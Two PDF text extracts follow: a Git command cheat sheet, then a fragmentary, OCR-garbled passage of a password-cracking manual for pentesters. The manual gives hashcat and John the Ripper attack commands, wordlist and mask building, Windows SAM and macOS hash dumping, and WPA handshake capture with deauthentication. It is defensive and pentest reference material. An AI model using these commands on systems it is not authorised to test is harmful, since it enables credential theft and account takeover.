{"source": "book", "book": "Books", "file": "github-git-cheat-sheet.pdf", "text": "Git distributions for Linux and POSIX systems are available on\nConfigure user information for all local repositories\nEnables helpful colorization of command line output\nSets the email you want attached to your commit transactions\nSets the name you want attached to your commit transactions\nClone (download) a repository that already exists on\nGitHub, including all of the files, branches, and commits\nWhen starting out with a new repository, you only need to do it\nonce; either locally, then push to GitHub, or by cloning an\nUpdates your current local working branch with all new\ncommits from the corresponding remote branch on GitHub.\ngit pull  is a combination of   git fetch  and   git merge\nSynchronize your local repository with the remote repository\nCombines remote tracking branch into current local branch\nDownloads all history from the remote tracking branches\ncurrent branch. This is usually done in pull requests,\nBranches are an important part of working with Git. Any\ncommits you make will be made on the branch you're currently\n\u201cchecked out\u201d to. Use  git status  to see which branch that is.\nSometimes it may be a good idea to exclude files from being\ntracked with Git. This is typically done in a special file named\n.gitignore  . You can find helpful templates for  .gitignore\nGit is the open source distributed version control system that facilitates GitHub activities on\nyour laptop or desktop. This cheat sheet summarizes commonly used Git command line\nEmail the Training Team or visit our web site for learning\ngit: an open source, distributed version-control system\nGitHub: a platform for hosting and collaborating on Git repositories\ncommit: a Git object, a snapshot of your entire repository compressed into a SHA\nclone: a local version of a repository, including all commits and branches\nremote: a common repository on GitHub that all team member use to exchange their changes\nfork: a copy of a repository on GitHub owned by a different user\npull request: a place to compare and discuss the differences introduced on a branch with reviews, comments, integrated\nHEAD: representing your current working directory, the HEAD pointer can be moved to different branches, tags, or commits\nRecords file snapshots permanently in version history\nOutputs metadata and content changes of the specified commit\nLists version history for a file, including renames\nDiscards all history and changes back to the specified commit\nCAUTION! Changing history can have nasty side effects. If you\nneed to change commits that exist on GitHub (the remote),\nproceed with caution. If you need help, reach out at\nUndoes all commits after [commit], preserving changes locally"}
{"source": "book", "book": "Books", "file": "Hash Crack \u2013 Password Cracking Manual (v2.0).pdf", "text": "All rights reserved. Without limiting the rights under the copyright reserved above, no part of this\npublication may be reproduced, stored in, or introduced into a retrieval system, or transmitted in any\nform or by any means (electronic, mechanical, photocopying, recording, or otherwise) without prior\nNetmux and the Netmux logo are registered trademarks of Netmux, LLC.\nOther product and company names mentioned herein may be the trademarks\nof their respective owners. Rather than use a trademark symbol with every\noccurrence of a trademarked name, we are using the names only in an\neditorial fashion and to the benefit of the trademark owner, with no intention\nThe information in this book is distributed on an \u201cAs Is\u201d basis, without\nwarranty. While every precaution has been taken in the preparation of this\nwork, neither the author nor Netmux LLC, shall have any liability to any\nperson or entity with respect to any loss or damage caused or alleged to be\ncaused directly or indirectly by the information contained in it.\nWhile every effort has been made to ensure the accuracy and legitimacy of\nthe references, referrals, and links (collectively \u201cLinks\u201d) presented in this\nbook/ebook, Netmux is not responsible or liable for broken Links or missing\nor fallacious information at the Links. Any Links in this book to a specific\nproduct, process, website, or service do not constitute or imply an\nendorsement by Netmux of same, or its producer or provider. The views and\nopinions contained at any Links do not necessarily express or reflect those of\nThis manual is meant to be a reference guide for cracking tool usage and\nsupportive tools that assist network defenders and pentesters in password\nrecovery (cracking). This manual will not be covering the installation of these\ntools, but will include references to their proper installation, and if all else\nfails, Google. Updates and additions to this manual are planned yearly as\nadvancements in cracking evolve. Password recovery is a battle against math,\ntime, cost, and human behavior; and much like any battle, the tactics are\nThis community would not enjoy the success and diversity without the\nAlexander \u2018Solar Designer\u2019 Peslvak, John The Ripper Team, & Community\nJens \u2018atom\u2019 Steube, Hashcat Team, & Devoted Hashcat Forum Community\nAnd many, many, many more contributors. If a name was excluded from the\nabove list please reach out and the next version will give them their due\nLastly, the tools, research, and resources covered in the book are the result of\npeople\u2019s hard work. As such, I HIGHLY encourage all readers to DONATE\nto help assist in their efforts. A portion of the proceeds from this book will be\nSuggestions or comments, send your message to hashcrack@netmux.com\nIn order to follow many of the techniques in this manual, you will want to\ninstall the following software on your Windows or *NIX host. This book\ndoes not cover how to install said software and assumes you were able to\nfollow the included links and extensive support websites.\nPACK V0.0.4 (Password Analysis and Cracking Toolkit)\nAdditionally you will need dictionaries/wordlists and highly recommend the\nhttps://crackstation.net/buy-crackstation-wordlist-password-cracking-\nhttps://wiki.skullsecurity.org/index.php?title=Passwords\nThroughout the manual, generic names have been given to the various inputs\nrequired in a cracking commands structure. Legend description is below:\nhashcat = Generic representation of the various Hashcat binary names\njohn = Generic representation of the John the Ripper binary names\n#type = Hash type; which is an abbreviation in John or a number in Hashcat\nhash.txt = File containing target hashes to be cracked\nrule.txt = File containing permutation rules to alter dict.txt input\npasswords.txt = File containing cracked password results\noutfile.txt = File containing results of some functions output\nLastly, as a good reference for testing various hash types to place into your\n\u201chash.txt\u201d file, the below sites contain all the various hashing algorithms and\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttp://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats\nEncoding = transforms data into a publicly known scheme for usability\nHashing = one-way cryptographic function nearly impossible to reverse\nEncrypting = mapping of input data and output data reversible with a key\nCPU = 2-72 cores mainly optimized for sequential serial processing\nGPU = 1000\u2019s of cores with 1000\u2019s of threads for parallel processing\nKeyspace: charset^length (?a?a?a?a = 95^4 = 81,450,625)\nHashrate: hashing function / hardware power (bcrypt / GTX1080 = 13094\nCracking Time: 81,450,625 / 13094 H/s = 6,220 seconds\n*Keyspace displayed and Hashrate vary by tool and hardware used\nSALT = random data that\u2019s used as additional input to a one-way function\nITERATIONS = the number of times an algorithm is run over a given hash\nHASH IDENTIFICATION: there isn\u2019t a foolproof method for identifying\nwhich hash function was used by simply looking at the hash, but there are\nreliable clues (i.e. $6$ sha512crypt). The best method is to know from where\nthe hash was extracted and identify the hash function for that software.\nDICTIONARY/WORDLIST ATTACK = straight attack uses a\nprecompiled list of words, phrases, and common/unique strings to attempt to\nBRUTE-FORCE ATTACK = attempts every possible combination of a\ngiven character set, usually up to a certain length.\nRULE ATTACK = generates permutations against a given wordlist by\nmodifying, trimming, extending, expanding, combining, or skipping words.\nMASK ATTACK = a form of targeted brute-force attack by using\nplaceholders for characters in certain positions (i.e. ?a?a?a?l?d?d).\nHYBRID ATTACK = combines a Dictionary and Mask Attack by taking\ninput from the dictionary and adding mask placeholders (i.e. dict.txt ?d?d?d).\nCRACKING RIG = from a basic laptop to a 64 GPU cluster, this is the\nhardware/ platform on which you perform your password hash attacks.\nKnow your cracking rig\u2019s capabilities by performing benchmark testing and\ndon\u2019t assume you can achieve the same results posted by forum members\nwithout using the exact same dictionary, attack plan, or hardware setup.\nCracking success largely depends on your ability to use resources efficiently\nand make calculated trade-offs based on the target hash.\nDictionaries and brute-force are not the end all be all to crack hashes. They\nare merely the beginning and end of an attack plan. True mastery is\neverything in the middle, where analysis of passwords, patterns, behaviors,\nand policies affords the ability to recover that last 20%. Experiment with your\nattacks and research and compile targeted wordlists with your new\nknowledge. Do not rely heavily on dictionaries because they can only help\nFollowing is basic cracking methodology broken into steps, but the process is\nsubject to change based on current/future target information uncovered\nPull hashes from target, identify hashing function, and properly format output\nFormat your hashes based on your tool\u2019s preferred method. See tool\ndocumentation for this guidance. Hashcat, for example, on each line takes\nUsing the Appendix table \u201cHash Cracking Speed (Slow-Fast)\u201d assess your\ntarget hash and it\u2019s cracking speed. If it\u2019s a slow hash, you will need to be\nmore selective at what types of dictionaries and attacks you perform. If it\u2019s a\nfast hash, you can be more liberal with your attack strategy.\nWith the information from evaluating the hash strength, baseline your\ncracking rig\u2019s capabilities. Perform benchmark testing using John The Ripper\nand/or Hashcat\u2019s built-in benchmark ability on your rig.\nBased on these results you will be able to better assess your attack options by\nknowing your rigs capabilities against a specific hash. This will be a more\naccurate result of a hash\u2019s cracking speed based on your rig. It will be useful\nBased on known or unknown knowledge begin creating an attack plan.\nIncluded on the next page is a \u201cBasic Cracking Playbook\u201d to get you started.\nAfter successfully cracking a sufficient amount of hashes analyze the results\nfor any clues or patterns. This analysis may aid in your success on any\nBased on you password analysis create custom attacks leveraging those\nknown clues or patterns. Examples would be custom mask attacks or rules to\nExperiment with Princeprocessor, custom Markov-chains, maskprocessor, or\ncustom dictionary attacks to shake out those remaining stubborn hashes. This\nis where your expertise and creativity really come into play.\nGo back to STEP 4 and continue the process over again, tweaking\ndictionaries, mask, parameters, and methods. You\u2019re in the grind at this point\nThis is only meant as a basic guide to processing hashes and each scenario\nwill obviously be unique based on external circumstances. For this attack\nplan we will assume we know the password hashes are raw MD5 and assume\nwe have already captured some plain text passwords of users. If we had no\nknowledge of plain text passwords we would most likely skip to\nDICTIONARY/WORDLIST attacks. Lastly, since MD5 is a \u201cFast\u201d hash we\nFirst compile your known plain text passwords into a custom wordlist file.\nPass this to your tool of choice as a straight dictionary attack.\nRun your custom wordlist with permutation rules to crack slight variations.\nhashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r best64.rule --loopback\nPerform a broad dictionary attack, looking for common passwords and leaked\nAdd rule permutations to the broad dictionary attack, looking for subtle\nchanges to common words/phrases and leaked passwords.\nhashcat -a 0 -m 0 -w 4 hash.txt dict.txt -r best64.rule --loopback\nAdd any newly discovered passwords to your custom wordlist and run an\nattack again with permutation rules, looking any other subtle variations.\nawk -F \u201c:\u201d \u2018{print $2}\u2019 hashcat.potfile >> custom_list.txt\nhashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r dive.rule --loopback\nNow we will use mask attacks included with Hashcat to search the keyspace\nfor common password lengths and patterns, based on the RockYou dataset.\nhashcat -a 3 -m 0 -w 4 hash.txt rockyou-1-60.hcmask\nUsing a dictionary of your choice, conduct hybrid attacks looking for larger\nvariations of common words or known passwords by appending/prepending\nhashcat -a 6 -m 0 -w 4 hash.txt dict.txt rockyou-1-60.hcmask\nhashcat -a 7 -m 0 -w 4 hash.txt rockyou-1-60.hcmask dict.txt\nAdd any newly discovered passwords back to your custom wordlist and run\nan attack again with permutation rules looking any other subtle variations.\nawk -F \u201c:\u201d \u2018{print $2}\u2019 hashcat.potfile >> custom_list.txt\nhashcat -a 0 -m 0 -w 4 hash.txt custom_list.txt -r dive.rule --loopback\nUsing a dictionary of your choice, perform a combo attack by individually\ncombining the dictionary\u2019s password candidates together to form new\nAdd any newly discovered passwords back to your custom wordlist and\nperform a hybrid attack against those new acquired passwords.\nawk -F \u201c:\u201d \u2018{print $2}\u2019 hashcat.potfile >> custom_list.txt\nhashcat -a 6 -m 0 -w 4 hash. txt custom_list.txt rockyou-1-60.hcmask\nhashcat -a 7 -m 0 -w 4 hash. txt rockyou-1-60.hcmask custom_list.txt\nBy now the easier, weaker passwords may have fallen to cracking, but still\nsome remain. Using PACK (on pg.51) create custom mask attacks based on\nyour currently cracked passwords. Be sure to sort out masks that match the\nhashcat -a 3 -m 0 -w 4 hash.txt custom_masks.hcmask\nWhen all else fails begin a standard brute-force attack, being selective as to\nhow large a keyspace your rig can adequately brute-force. Above 8 characters\nthis is typically pointless due to hardware limitations and password entropy/\nhashcat -a 3 -m 0 -w 4 hash.txt -i ?a?a?a?a?a?a?a?a\njohn --format=#type --mask=?l?l?l?l?l?l hash.txt -min-len=6\njohn --format=<OpenCLformat> hash.txt --wordlist=dict.txt --rules --\njohn --wordlist=dict.txt hash.txt --rules --dev=<#> --fork=8\njohn --wordlist=dict.txt --stdout --external:[filter name] > out.txt\nhashcat -a 0 -m #type hash.txt dict.txt -r rule.txt\nhashcat -a 0 -m #type hash.txt dict.txt -r rule.txt\nhashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -j <option>\nhashcat -a 1 -m #type hash.txt left_dict.txt right_dict.txt -k <option>\nhashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment\nhashcat -a 3 -m #type hash.txt ?a?a?a?a?a --increment-min=4\nhashcat -a 3 -m #type hash.txt ?a?a?a?a?a?a --increment-max=5\nhashcat -a 0 -m #type --length-limit-disable hash.txt dict.txt\nhashcat -a 0 -m #type --session <uniq_name> hash.txt dict.txt\nhashcat -a 0 -m #type --restore --session <uniq_name> hash.txt dict.txt\nhashcat -a 0 -m #type --keyspace hash.txt dict.txt -r rule.txt\nhashcat -a 0 -m #type -o results.txt hash.txt dict.txt\nhashcat -a 3 -m #type hash.txt -1 ?l?u -2 ?l?d?s ?l?2?a?d?u?l\nhashcat -a 0 -m #type hash.txt dict.txt -r rule.txt\ndelete everything from the cursor to the beginning of the line\ndelete the previous word on the command line before the cursor\nsearch command history in reverse, continue pressing key\nsequence to continue backwards search. Esc when done or\nExtract all lowercase strings from each line and output to wordlist.\nExtract all uppercase strings from each line and output to wordlist.\nExtract all lowercase/uppercase strings from each line and output to wordlist.\nExtract all digits from each line in file and output to wordlist.\nWatch hashcat potfile or designated output file live.\nwatch -n .5 tail -50 <hashcat.potfile or outfile.txt>\nPull 100 random samples from wordlist/passwords for visual analysis.\nPrint statistics on length of each string and total counts per length.\nRemove all duplicate strings and count how many times they are present;\nCommand to create quick & dirty custom wordlist with length 1-15 character\nwords from a designated website into a sorted and counted list.\ncurl -s http://www.netmux.com | sed -e 's/<[^>]*>//g' | tr \" \"\n\"\\n\" | tr -dc '[:alnum:]\\n\\r' | tr \u2018[:upper:]\u2019 \u2018[:lower:]\u2019 | cut -c 1-\nwhile read line; do echo -n $line | md5; done < infile.txt > outfile.txt\nwhile read line; do echo -n $line | md5sum; done < infile.txt | awk -F \u201c \u201c\nRemove lines that match from each file and only print remaining from\nTake two ordered files, merge and remove duplicate lines and maintain\nsort -n outfile.txt | awk -F \u201c:\u201d \u2018{print $2}\u2019 | awk \u2018!seen[$0]++\u2019 > final.txt\nExtract strings of a specific length into a new file/wordlist.\nConvert alpha characters on each line in file to lowercase characters.\nConvert alpha characters on each line in file to uppercase characters.\nSplit a file into separate files by X number of lines per outfile.\nReverse the order of each character of each line in the file.\nSort each line in the file from shortest to longest.\nawk \u2018{print length,$0}\u2019 \u201c\u201d $0; }\u2019 infile.txt | sort -n | cut -d \u2018 \u2018 -f2-\nSort each line in the file from longest to shortest.\nawk \u2018{print length,$0}\u2019 \u201c\u201d $0; }\u2019 infile.txt | sort -r -n | cut -d \u2018 \u2018 -f2-\nSubstring matching by converting to HEX and then back to ASCII.\n(Example searches for 5 character strings from file1.txt found as a substring\nstrings file1.txt | xxd -u -ps -c 5 | sort -u > out1.txt\nstrings file2.txt | xxd -u -ps -c 20 | sort -u > out2.txt\ngrep -Ff out1.txt out2.txt | xxd -r -p > results.txt\ncat dict.txt | tr -cd \u201c[:print :][/n/t]\\n\u201d > outfile.txt\nC:\\WIND0WS\\system32>reg.exe save HKLM\\SAM sam_backup.hiv\nC:\\WIND0WS\\system32>reg.exe save HKLM\\system sys_backup.hiv\ncachedump.py <system hive> <security hive> <Vista/7>\nPost exploitation commands must be executed from SYSTEM level\nC:\\WIND0WS\\system32>reg.exe save HKLM\\SAM sam_backup.hiv\nroot:$6$52450745$k5ka2p8bFuSmoVTltz0yyuaREkkKBcCNqoDKzYiDL\ndscl localhost -read /Search/Users/<username>|grep GeneratedUID|cut -\nc15-cat /var/db/shadow/hash/<GUID> | cut -c169-216 > osx_hash.txt\nsudo defaults read /var/db/dslocal/nodes/Default/users/<username>.plist\nShadowHashData|tr -dc \u2018 0-9a-f\u2019|xxd -p -r|plutil -convert xml1 - -o -\n/var/db/dslocal/nodes/Default/users/<username>.plist\nhttps://github.com/truongkma/ctf-tools/blob/master/John/run/ml2john.py\nsudo ml2john.py /var/db/dslocal/nodes/Default/users/<username>.plist\nCapture the 4-way WPA/WPA2 authentication handshake.\nStep 1: Create monitoring interface mon0 Ex) interface wlan0\nStep 2: Capture packets to file on target AP channel Ex) channel 11\nStep 3: Start deauth attack against BSSID Ex) bb:bb:bb:bb:bb:bb\nStep 4: Wait for confirmation to appear at top of terminal:\nCH 11 ][ Elapsed: 25 s ][ <DATE / TIME) ][ WPA handshake: **\nStep 5: Extract handshake into JOHN or HASHCAT format:\nStepl: cap2hccap.bin -e \u2018<ESSID>\u2019 capture.cap capture_out.hccap\nHCXTOOLS: capture and convert packets from wlan devices for use with\nSELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;\nJohn The Ripper Jumbo comes with various programs to extract hashes:\n-50% chance a user\u2019s password will contain one or more vowels.\n-Women prefer personal names in their passwords, and men prefer hobbies.\n-Most likely to be used symbols: ~, !, @, #, $, %, &, *, and ?\n-If a number, it\u2019s usually a 1 or 2, sequential, and will likely be at the end.\n-If more than one number it will usually be sequential or personally relevant.\n-If a capital letter, it\u2019s usually the beginning, followed by a vowel.\n-66% of people only use 1 - 3 passwords for all online accounts.\n-One in nine people have a password based on the common Top 500 list.\n-Western countries use lowercase passwords and Eastern countries prefer\n20-60-20 rule is a way to view the level of difficulty typically demonstrated\nby a large password dump, having characteristics that generally err on the\nside of a Gaussian Curve, mirroring the level of effort to recover said\n20% of passwords are easily guessed dictionary words or known common\n60% of passwords are moderate to slight variations of the earlier 20%.\n20% of passwords are hard, lengthy, complex, or of unique characteristics.\nThis is an example list of passwords to help convey the variation and\ncommon complexities seen with typical password creation. It also shows\nindividual user biases to aid in segmenting your attacks to be tailored toward\n*This List of passwords will be referenced throughout the book and the List\ncan also be found online at: https://github.com/netmux/HASH-CRACK\nA password can contain many useful bits of information related to it\u2019s creator\nand their tendencies/patterns, but you have to break down the structure to\ndecipher the meaning. This analysis process could be considered a sub-\ncategory of Text Analytics\u2019 and split into three pattern categories I\u2019m calling:\n*Refer to EXAMPLE HASH & PASSWORDS chapter (pg.29) for numbered\nBasic Pattern : visually obvious when compared to similar groupings (i.e.\nlanguage and base word/words & digits). Let\u2019s look at Alice\u2019s passwords\n-Ending in a 4 digit date with common special character: 2017! & 1981!\n!TIP! This type of basic pattern lends itself to a simple dictionary and L33T\nspeak rule appending dates or hybrid mask attack appending Dict+ ?d?d?d?d?\nMacro-Pattern : statistics about the passwords underlying structure such as\nlength and character set. Let\u2019s look at Craig\u2019s passwords (6,9):\n-Length structure can be summed up as: 4 Digits + 7 Alpha & 7 Alpha + 4\n-Uses charsets ?l?u?d , so we may be able to ignore special characters.\n-Basic Pattern preference for the numbers 7482 and Micro-Pattern for\n!TIP! You can assume this user is \u2018unlikely\u2019 to have a password less than 12\ncharacters (+-1 char) and the 4 digit constant lowers the work to 8 chars.\nThese examples lend themselves to a Hybrid Attack (Dict + 7482) or (7482 +\nMicro-Pattern : subtlety and context which expresses consistent case\nchanges, themes, and personal data/interest. Let\u2019s look at Bob\u2019s passwords\n-Lastly, ending in a 3 digit sequential pattern: 345 & 789\n!TIP! This pattern lends itself to a custom combo dictionary and rule or\nhybrid mask attack appending sequential digits ?d?d?d\nSo when analyzing passwords be sure to group passwords and look for\npatterns such as language, base word/digit, length, character sets, and subtle\nthemes with possible contextual meaning or password policy restrictions.\nPassword Length Distribution based on large corpus of English website\nCharacter frequency analysis of a large corpus of English texts:\nCharacter frequency analysis of a large corpus of English password dumps:\nTop Western password masks out of a large corpus of English website\nPassword Length Distribution based on large corpus of Chinese website\nCharacter frequency analysis of a large corpus of Chinese texts:\nCharacter frequency analysis of a large corpus of Chinese password dumps:\nTop Eastern password masks out of a large corpus of Chinese website dumps:\n-default password 15 characters with \u201c-\u201d & four groups of three random\nu=ABCDEFGHJKLMNPQRSTUVWXYZ l=abcdefghkmnopqrstuvwxy and\n-default password 12 characters using just letters and digits.\n-default password 20 characters using uppercase, lowercase, digits, and\n-default password 12 characters using at least one digit, uppercase and\n-default password 15 characters using uppercase, lowercase, digits, and\n-default password 8 characters using uppercase, lowercase, and digits.\n-default password 16 characters using uppercase, lowercase, digits, and\n-default password 24 characters using uppercase, lowercase, digits, and\nGenerate statistics about the most common length, percentages, character-set\nand other characteristics of passwords from a provided list.\nOutput stats of passwords.txt to file example.mask:\nHide less than 1% occurrence; only analyze passwords 7 characters and\npython statsgen.py passwords.txt --hiderare --minlength=7 -o example.mask\nA realistic password strength (entropy) estimator developed by Dropbox.\nPassword analyzer that produces stats and pattern frequency analysis.\nCharacter frequency analysis is the study of the frequency of letters or groups\nof letters in a corpus/text. This is the basic building block of Markov chains.\nTool to analyze a large list of passwords and summarize the character\nfrequency. https://github.com/jcchurch/Character-Frequency-CLI-Tool\nAnalyzes public password dumps and provides efficient dictionaries for\nImportant password security and authentication research papers in one place.\nCompiled analysis of larger password dumps using PIPAL and PASSPAL\nhttp://www.thepasswordproject.com/leaked_password_lists_and_dictiona\nhttps://crackstation.net/buy-crackstation-wordlist-password-cracking-\nhttps://wiki.skullsecurity.org/index.php?title=Passwords\nhttps://www.eff.org/files/2016/07/18/eff_large_wordlist.txt\nhttps://www.eff.org/files/2016/09/08/eff_short_wordlist_1.txt\n*Rainbow Tables are for the most part obsolete but provided here for\nGenerate wordlist that meets complexity specified in the complex filter.\njohn --wordlist=dict.txt --stdout --external : [filter name] > outfile.txt\nStripping characters from a password list to reach the \u201cstem\u201d or base\nword/words of the candidate password. Commands are from \u201cFile\nExtract all lowercase strings from each line and output to wordlist.\nExtract all uppercase strings from each line and output to wordlist.\nExtract all lowercase/uppercase strings from each line and output to wordlist.\nExtract all digits from each line in file and output to wordlist.\nCombine multiple wordlists with each word appended to the other.\ncombinator.bin dict1.txt dict2.txt > combined_dict.txt\ncombinator3.bin dict1.txt dict2.txt dict3.txt > combined_dict.txt\nCut the specific length off the existing wordlist and pass it to STDOUT.\ncutb.bin offset [length] < infile.txt > outfile.txt\nExample to cut first 4 characters in a wordlist and place into a file:\nCompares a file against another file or files and removes all duplicates.\nDictionary candidates are passed to stdout if it matches an specified\npassword group criteria/requirement. Groups can be added together (i.e.\n8 = OTHER (All other characters not matching 1,2, or 4)\nThis example would stdout all candidates matching upper and lower\nCreates \u201cunique combinations\u201d of a custom dictionary; dictionary\ncannot be greater than 64 lines; option -1 limits candidates to 15\nDictionary into stdin is parsed and split into all its single chars (up to 4)\nEach candidate in a dictionary is checked for length and sent to stdout.\nThis example would send to stdout all candidates 5 to 10 chars long.\nAuto generates insertion rules for the most frequent chains of characters\nDictionary into stdin parsed and run through \u201cThe Countdown\nWordlist generator can specify a character set and generate all possible\ncrunch <min length> <max length> <character set> -o outfile.txt\nCustom wordlist generator scrapes & compiles keywords from websites.\nExample scan depth of 2 and minimum word length of 5 output to\ncewl -d 2 -m 5 -w wordlist.txt http://<target website>\nText file and website scraper which generates custom wordlists from content.\nhttp://www.smeegesec.com/2014/01/smeegescrape-text-scraper-and-\nCompile unique keywords from text file and output into wordlist.\nScrape keywords from target website and output into wordlist.\nSmeegeScrape.py -u http://<target website> -si -o wordlist.txt\nUse the below methods to generate hashes for specific algorithms.\nhttps://github.com/hashcat/hashcat/tree/master/tools\nGenerator using song lyrics from chosen artist to create custom\nhashcat -a 0 -m #type hash.txt dict.txt --encoding-from=utf-8\nhashcat -a 0 -m #type hash.txt dict.txt --encoding-to=iso-8859-15\niconv -f <old_encode> -t <new_encode> < dict.txt | sponge dict.txt.enc\nExample of converting $HEX[] entries in hashcat.potfile to ASCII\ngrep \u2018$HEX\u2019 hashcat.pot | awk -F \u201c:\u201d {\u2018print $2\u2019} |perl -ne \u2018 i f ($_ =~\nm/\\$HEX\\ [([A-Fa-f0-9]+)\\]/) {print pack (\u201cH*\u201d, $1), \u201c\\n\u201d}\u2019\n1-Create a custom dictionary using CeWL from www.netmux.com website:\ncewl -d 2 -m 5 -w custom_dict.txt http://www.netmux.com\n2-Combine the new custom_dict.txt with the Google 10,000 most common\nEnglish words: https://github.com/first20hours/google-10000-english\n3-Combine with Top 196 passwords from \u201cProbable Wordlists\u201d:\ngithub.com/berzerk0/Probable-Wordlists/blob/master/Real-Passwords\n4-Combo the Topl96-probable.txt together using Hashcat-util\ncombinator.bin Topl96-probable.txt Topl96-probable.txt >>\n5-Run the best64.rule from Hashcat on Top196-probable.txt and send that\nhashcat -a 0 Topl96-probable.txt -r best64.rule --stdout >>\nCan you now come up with an attack that can crack this hash?\nBelow we apply basic rules to help explain the expected output when using\nMaskprocessor can be used to generate a long list of rules very quickly.\nExample rule creation of prepend digit and special char to dictionary\nExample creating rule with custom charset appending lower, uppercase chars\nand all digits to dictionary candidates (i.e. $a $Q $1 , $e $ A $2, . . . ) :\nhashcat -a 0 -m #type -g <#rules> hash.txt dict.txt\ngenerate-rules.bin <#rules> <seed> | ./cleanup-rules.bin [1=CPU,2=GPU] >\ngenerate-rules.bin 1000 42 | ./cleanup-rules.bin 2 > out.txt\nhashcat -a 0 -m #type --debug-mode=l --debug-file=debug.txt hash.txt -r\nPACK (Password Analysis and Cracking Kit) RULE CREATION\nAdvanced techniques for reversing source words and word mangling rules\nfrom already cracked passwords by continuously recycling/expanding\ngenerated rules and words. Outputs rules in Hashcat format.\nhttp://thesprawl.org/research/automatic-password-rule-analysis-generation/\n**Ensure you install \u2018AppleSpell\u2019 \u2018aspell* module using packet manager**\n--threads=THREADS Parallel threads to use for processing.\nAnalysis of a single password to automatically detect rules and potential\nanalysis.word - unsorted and non-uniqued source words\nanalysis-sorted.word - occurrence sorted and unique source words\nanalysis-sorted.rule - occurrence sorted and unique rules\nExample brute-force all possible combinations 7 characters long:\nExample brute-force all possible combinations 1 - 7 characters long:\nExample brute-force uppercase first letter, 3 unknown middle\nExample brute-force known first half word \u201csecret\u201d and unknown\nExample hybrid mask (leftside) + wordlist (rightside) (i.e. 123!Password)\nExample wordlist (leftside) + hybrid mask (rightside) (i.e. Passwordl23!)\nFour custom buffer charsets to create efficient targeted mask attacks defined\nExample custom charset targeting passwords that only begin in\na,A,b,B,or c,C , 4 unknown middle characters, and end with a digit (i.e.\nal7z#q7): hashcat -a 3 -m #type hash.txt -1 abcABC ?l?a?a?a?a?d\nExample custom charset targeting passwords that only begin in\nuppercase or lowercase, 4 digits in the middle, and end in special\nhashcat -a 3 -m #type hash.txt -1 ?u?l -2 !@$ ?l?d?d?d?d?2\nExample using all four custom charsets at once (i.e. pow!12er):\nhashcat -a 3 -m #type hash.txt -1 qwer -2 poiu -3 123456 -4 !@#$% ?2?2?1?\nExample brute-force all possible combinations up to 7 characters long:\nExample brute-force uppercase first letter, 3 unknown middle\nExample brute-force known first half word \u201csecret\u201d and unknown\nExample mask (leftside) + wordlist (rightside) (i.e. 123!Password)\njohn --format=#type hash.txt --wordlist=dict.txt --mask=?a?a?a?a?w\nExample wordlist (leftside) + mask (rightside) (i.e. Password123!)\njohn --format=#type hash.txt --wordlist=dict.txt --mask=?w?a?a?a?a\nNine custom buffer charsets to create efficient targeted mask attacks defined\nExample custom charset targeting passwords that only begin in\na,A,b,B,or c,C , 4 unknown middle characters, and end with a digit (i.e.\njohn --format=#type hash.txt -1=abcABC --mask=?l?a?a?a?a?d\nExample custom charset targeting passwords that only begin in\nuppercase or lowercase, 4 digits in the middle, and end in special\njohn --format=#type hash.txt -1=?u?l -2=!@$ --mask=?l?d?d?d?d?2\nExample using four custom charsets at once (i.e. pow!12er):\njohn --format=#type hash.txt -1=qwer -2=poiu -3=123456 -4=!@#$%, --\nHashcat allows for the creation of mask f i l es by placing custom masks, one\nper line, in a text f i l e with \u201c.hcmask\u201d extension.\nMaskGen allows you to automatically generate pattern-based mask attacks\nfrom known passwords and filter by length and desired cracking time.\nGather stats about cracked passwords.txt and hide the less than 1%\nSave masks stats to a .mask file for further analysis:\npython statsgen.py --hiderare passwords.txt -o example.mask\nAnalyze example.mask results, number of masks, estimated time to\nCreate 24 hour (86400 seconds) mask attack based on cracking speed of\na single GTX 1080 against MD5 hashes 24943.1 MH/s(based on appendix\n!Substitute your GPU\u2019s cracking speed against MD5 (c/s)!.\npython maskgen.py example.mask --targettime=86400 --optindex --\nOutput 24 hour mask attack to a .hcmask file for use in Hashcat:\npython maskgen.py example.mask --targettime=86400 --optindex --\nUse your new example.hcmask file with Hashcat in mask attack mode:\nGenerate a collection of masks following the password complexity in order to\nDefine the minimum (or maximum) password strength policy that\nGenerate mask attack for password policy 8 character length requiring\nat least 1 lowercase, 1 uppercase, 1 digit, and 1 special character:\npython policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1\nGenerate mask attack and estimate time of completion based on GTX\n1080 against MD5 hashes 24943.1 MH/s(based on appendix table) for\npassword policy 8 character length requiring at least 1 lowercase, 1\npython policygen.py --minlength 8 --maxlength 8 --minlower 1 --minupper 1\n--mindigit 1 --minspecial 1 -o example.hcmask --pps=24943000000\nhashcat -a 3 -m #type hash.txt -1 12 -2 90 -3 01 -4 123 ?l?2?3?d?4?d\nhashcat -a 3 -m #type hash.txt -1 12 -2 90 -3 01 -4 123 ?l?2?d?d?3?d? 4?d\nhashcat -a 3 -m #type hash.txt -1 147 -2 258 -3 369 ?l?2?3?s\nhashcat -a 3 -m #type hash.txt --hex-charset -1 d8d9dadbdcdd -2\n8788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0ala2a3a4a5a6a\nafb0blb2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?1?2?1?2?1?2\nhashcat -a 3 -m #type hash.txt --hex-charset -1 e0 -2 a6a7a8a9aaabacad -3\n82838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0ala\naaabacadaeafb0blb2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?3?1?2?3?1?2?3?\nhashcat -a 3 -m #type hash.txt --hex-charset -1 e4 -2 b8b9babb -3\n868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0ala2a3a4a5a\naeafb0blb2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?3?1?2?3?1?2?3?1?2?3\nhashcat -a 3 -m #type hash.txt --hex-charset -1 e3 -2 818283848586 -3\n8485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0ala2a3a\nacadaeafb0blb2b3b4b5b6b7b8b9babbbcbdbebf -i ?1?2?3?1?2?3?1?2?3?1?2?\nhashcat -a 3 -m #type hash.txt --hex-charset -1 d0dld2d3d4 